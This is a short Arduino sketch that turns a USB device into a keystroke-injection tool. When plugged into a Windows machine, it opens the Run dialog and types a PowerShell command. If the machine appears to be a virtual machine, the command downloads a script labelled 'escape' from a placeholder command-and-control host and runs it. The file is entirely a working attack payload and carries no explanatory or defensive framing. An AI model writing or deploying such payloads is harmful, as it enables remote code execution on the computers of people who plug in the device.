#include <USBHIDKeyboard.h>
USBHIDKeyboard Keyboard;

void setup() {
  Keyboard.begin();
  delay(3000);
  
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(500);
  Keyboard.println(F("powershell -c \"if((Get-WmiObject -Class Win32_ComputerSystem).Model -like '*Virtual*'){Invoke-WebRequest http://C2_SERVER/escape | IEX}\""));
}

void loop() {}
